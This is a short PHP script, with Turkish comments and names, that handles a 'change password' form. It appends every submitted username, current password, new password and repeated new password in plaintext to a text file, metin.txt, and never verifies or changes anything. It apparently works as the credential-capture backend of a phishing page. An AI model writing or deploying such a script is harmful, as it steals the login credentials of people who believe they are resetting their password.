<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $kullaniciAdi = $_POST["uname"];
    $mevcutSifre = $_POST["password"];
    $yeniSifre = $_POST["newPassword"];
    $yeniSifreTekrar = $_POST["new2Password"];

    // Burada metin.txt dosyasına verileri yazma işlemini gerçekleştirebilirsiniz.
    $file = fopen("metin.txt", "a"); // "a" dosyanın sonuna ekleme yapar
    fwrite($file, "Kullanıcı Adı: " . $kullaniciAdi . "\n");
    fwrite($file, "Mevcut Şifre: " . $mevcutSifre . "\n");
    fwrite($file, "Yeni Şifre: " . $yeniSifre . "\n");
    fwrite($file, "Yeni Şifre Tekrar: " . $yeniSifreTekrar . "\n");
    fwrite($file, "--------------------------------\n");
    fclose($file);
}
?>
